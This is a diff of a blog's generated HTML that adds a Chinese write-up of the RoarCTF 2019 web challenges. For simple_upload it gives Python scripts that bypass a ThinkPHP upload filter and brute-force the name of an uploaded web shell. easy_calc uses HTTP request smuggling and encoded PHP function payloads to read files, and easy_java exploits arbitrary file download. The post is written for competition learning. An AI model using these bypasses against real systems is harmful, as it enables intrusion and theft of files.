@@ -22,7 +22,7 @@
     <meta name="description" content="一花一世界，一木一森林">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>Ethan&#39;s Blog</title>
+    <title>RoarCTF2019 web writeup · Ethan&#39;s Blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -203,12 +203,23 @@
 </head>
 
     
+        <body class="post-body">
+    
     
 <header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/">Ethan&#39;s Blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">RoarCTF2019 web writeup</a>
+            </div>
+    </div>
     
     <a class="home-link" href="/">Ethan's Blog</a>
 </header>
@@ -220,24 +231,74 @@
 
 
 
+
+height:50vh;
 ">
     
     <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/)"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
+            
+            RoarCTF2019 web writeup
+            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
+            
+            <!-- 404 -->
+            
         </p>
         <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class="post-intro-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="web">web</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">921</span>阅读时长: <span class="post-count reading-time">3 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/10/14</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
         
     </div>
 </div>
@@ -338,126 +399,85 @@
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <main class="main index-page">
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2019/10/14/RoarCTF2019 web writeup/">
-            
-                <span>RoarCTF2019 web writeup</span>
-        </a>
-        <div class="abstract-content">
-            <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>周末空闲打了嘶吼ctf，被虐了一批，大佬们太强了，最后只能勉强苟个第8，因为题目质量还不错，所以写个web的writeup。</p>
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/10/14</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="web">web</a>
-    
-</div>
-            
-        </div>
+            <main class="main post-page">
+    <article class="article-entry">
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>周末空闲打了嘶吼ctf，被虐了一批，大佬们太强了，最后只能勉强苟个第8，因为题目质量还不错，所以写个web的writeup。</p>
+<a id="more"></a>
+<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><h4 id="simple-upload"><a href="#simple-upload" class="headerlink" title="simple_upload"></a>simple_upload</h4><h5 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h5><p>听说这个是0day，拿来出题的，是用的thinkphp写的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $uploadFile = $_FILES[<span class="string">'file'</span>] ;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (strstr(strtolower($uploadFile[<span class="string">'name'</span>]), <span class="string">".php"</span>) ) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        $upload = <span class="keyword">new</span> \Think\Upload();<span class="comment">// 实例化上传类</span></span><br><span class="line">        $upload-&gt;maxSize  = <span class="number">4096</span> ;<span class="comment">// 设置附件上传大小</span></span><br><span class="line">        $upload-&gt;allowExts  = <span class="keyword">array</span>(<span class="string">'jpg'</span>, <span class="string">'gif'</span>, <span class="string">'png'</span>, <span class="string">'jpeg'</span>);<span class="comment">// 设置附件上传类型</span></span><br><span class="line">        $upload-&gt;rootPath = <span class="string">'./Public/Uploads/'</span>;<span class="comment">// 设置附件上传目录</span></span><br><span class="line">        $upload-&gt;savePath = <span class="string">''</span>;<span class="comment">// 设置附件上传子目录</span></span><br><span class="line">        $info = $upload-&gt;upload() ;</span><br><span class="line">        <span class="keyword">if</span>(!$info) &#123;<span class="comment">// 上传错误提示错误信息</span></span><br><span class="line">          <span class="keyword">$this</span>-&gt;error($upload-&gt;getError());</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;<span class="comment">// 上传成功 获取上传文件信息</span></span><br><span class="line">          $url = __ROOT__.substr($upload-&gt;rootPath,<span class="number">1</span>).$info[<span class="string">'file'</span>][<span class="string">'savepath'</span>].$info[<span class="string">'file'</span>][<span class="string">'savename'</span>] ;</span><br><span class="line">          <span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">"url"</span>=&gt;$url,<span class="string">"success"</span>=&gt;<span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>构造上传包，fuzz后使用<code>xxxx.&lt;&gt;php</code>绕过上传检测</p>
+<p><img src="images\1.png" alt></p>
+<p>上传成功，访问shell即可拿到flag。</p>
+<p><img src="images\2.png" alt></p>
+<h5 id="解法2"><a href="#解法2" class="headerlink" title="解法2"></a>解法2</h5><p>ThinkPHP默认上传文件名是递增的。代码中ThinkPHP的后缀过滤无效，所以通过上传多个文件的方式，绕过.php后缀的判断，文件名，需要爆破</p>
+<p>写脚本上传一个正常文件，再上传多个文件，再上传一个正常文件。然后获取到第一三次上传的文件名</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://lo408dybroarctf.4hou.com.cn:34422/index.php/Home/Index/upload"</span></span><br><span class="line"></span><br><span class="line">files1 = &#123;<span class="string">'file'</span>: open(<span class="string">'test.txt'</span>,<span class="string">'r'</span>)&#125;</span><br><span class="line">files2 = &#123;<span class="string">'file[]'</span>: open(<span class="string">'test.php'</span>,<span class="string">'r'</span>)&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(url,files=files1)</span><br><span class="line"><span class="keyword">print</span>(r.text)</span><br><span class="line"></span><br><span class="line">r = requests.post(url,files=files2)</span><br><span class="line"><span class="keyword">print</span>(r.text)</span><br><span class="line"></span><br><span class="line">r = requests.post(url,files=files1)</span><br><span class="line"><span class="keyword">print</span>(r.text)</span><br></pre></td></tr></table></figure>
+<p>爆破一下第一三文件名之间的所有文件名</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"><span class="comment">#&#123;"url":"\/Public\/Uploads\/2019-10-12\/5da1b52bb3645.txt","success":1&#125;</span></span><br><span class="line"><span class="comment">#&#123;"url":"\/Public\/Uploads\/","success":1&#125;</span></span><br><span class="line"><span class="comment">#&#123;"url":"\/Public\/Uploads\/2019-10-12\/5da1b52bd6f0a.txt","success":1&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = <span class="string">"1234567890abcdef"</span></span><br><span class="line"><span class="keyword">for</span> i in s:</span><br><span class="line">	<span class="keyword">for</span> j in s:</span><br><span class="line">		<span class="keyword">for</span> k in s:</span><br><span class="line">			<span class="keyword">for</span> l in s:</span><br><span class="line">				url = <span class="string">"http://lo408dybroarctf.4hou.com.cn:34422/Public/Uploads/2019-10-12/5da1b52bc%s%s%s%s.php"</span>%(i,j,k,l)</span><br><span class="line">				r = requests.get(url)</span><br><span class="line"><span class="comment">#				print(url)</span></span><br><span class="line">				<span class="keyword">if</span> r.status_code != <span class="number">404</span>:</span><br><span class="line">					<span class="keyword">print</span>(url)</span><br><span class="line">					<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<p>爆破到文件名后，即可访问上传的木马，拿到flag</p>
+<h4 id="easy-calc"><a href="#easy-calc" class="headerlink" title="easy_calc"></a>easy_calc</h4><p>这题首先进去发现是一个计算器的题目。</p>
+<p><img src="images\7.png" alt></p>
+<p>这道题是国赛的<strong>love_math</strong>的修改版，除去了长度限制，payload中不能包含’ ‘, ‘\t’, ‘\r’, ‘\n’,’’’, ‘“‘, ‘`’, ‘[‘, ‘]’ 等字符，不同的是网站加了waf，需要绕过waf。首先需要绕过waf，测试发现当我们提交一些字符时，会直接403，经测试发现存在服务器存在http走私漏洞，可以用来绕waf，详情见：<a href="https://paper.seebug.org/1048/" target="_blank" rel="noopener">https://paper.seebug.org/1048/</a></p>
+<p><img src="images\10.png" alt></p>
+<p>因为禁掉了一些字符，所以导致我们不能直接getflag，继续分析payload构造</p>
+<p>这里用到几个php几个数学函数。</p>
+<p>我们首先要构造列目录的payload，肯定要使用<code>scandir</code>函数，尝试构造列举根目录下的文件。<code>scandir</code>可以用<code>base_convert</code>函数构造，但是利用<code>base_convert</code>只能解决<code>a~z</code>的利用，因为根目录需要<code>/</code>符号，且不在<code>a~z</code>,所以需要<code>hex2bin(dechex(47))</code>这种构造方式，<code>dechex()</code> 函数把十进制数转换为十六进制数。<code>hex2bin()</code> 函数把十六进制值的字符串转换为 ASCII 字符。</p>
+<p><img src="images\6.png" alt></p>
+<p>构造读取flag，使用<code>readfile</code>函数，paload：<code>base_convert(2146934604002,10,36)(hex2bin(dechex(47)).base_convert(25254448,10,36))</code>，方法类似</p>
+<p><img src="images\3.png" alt></p>
+<h4 id="easy-java"><a href="#easy-java" class="headerlink" title="easy_java"></a>easy_java</h4><p>这道进去首先想到的就是任意文件下载，但是刚开始用<code>GET</code>方式一直什么都下载不了，连网站确定目录的图片都下不了。后来修改为post，可以了。。。</p>
+<p><img src="images\4.png" alt></p>
+<p>尝试读取<code>WEB-INF/web.xml</code>发现操作flag的关键文件位置</p>
+<p><img src="images\5.png" alt></p>
+<p>将图中base64解码即flag。</p>
+
     </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2019/05/30/强网杯web部分writeup/">
-            
-                <span>强网杯web部分writeup</span>
-        </a>
-        <div class="abstract-content">
-            <h2 id="题记"><a href="#题记" class="headerlink" title="题记"></a><strong>题记</strong></h2><p>2019年的强网杯web题目出的都不错，所以对题目进行分析一下！</p>
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/05/30</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="web">web</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2019/04/02/AWD线下准备指南/">
-            
-                <span>AWD线下备忘录</span>
-        </a>
-        <div class="abstract-content">
-            <h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><p>AWD模式是一个非常有意思的比赛模式，其过程也是惊险刺激！今天主要对后门进行一个汇总！</p>
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/04/02</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="web">web</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2018/09/02/萌萌哒报名系统/">
-            
-                <span>CTF&amp;&amp;lctf</span>
-        </a>
-        <div class="abstract-content">
-            <h5 id="题记："><a href="#题记：" class="headerlink" title="题记："></a>题记：</h5><p>最近在服务器上复现了一些CTF题目，所以对这些题目整理上相应的writeup。所以，才有了今天的文章。<br>
-        </p></div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/09/02</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="web">web</a>
-    
-</div>
-            
-        </div>
-    </article>
+    <!-- license  -->
     
     <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2019/09/22/Thinkphp反序列化利用分析/" title="Thinkphp反序列化利用链深入分析">
+                    <div class="prevTitle">Thinkphp反序列化利用链深入分析</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
     
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+    <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+    <div id="comment"></div>
+    <script>
+    new Valine({
+        el: '#comment' ,
+        notify:false, 
+        verify:false, 
+        appId: "FuPdFy9xCtoivKmiix3FHb4d-gzGzoHsz",
+        appKey: "pAQSVceyfizzVqhmmyUQeX2j",
+        placeholder: "一起唠嗑:)",
+        path:window.location.pathname, 
+        avatar:'mm' 
+    });
+    </script>
+
+
+    <!-- 评论 -->
 </main>
             <!-- profile -->
             
@@ -546,6 +566,24 @@
 </footer>
     </div>
     <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#正文"><span class="toc-number">2.</span> <span class="toc-text">正文</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#simple-upload"><span class="toc-number">2.1.</span> <span class="toc-text">simple_upload</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#解法1"><span class="toc-number">2.1.1.</span> <span class="toc-text">解法1</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#解法2"><span class="toc-number">2.1.2.</span> <span class="toc-text">解法2</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#easy-calc"><span class="toc-number">2.2.</span> <span class="toc-text">easy_calc</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#easy-java"><span class="toc-number">2.3.</span> <span class="toc-text">easy_java</span></a></li></ol></li></ol>
+    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -1470,6 +1508,8 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
      
     </body>
 </html>
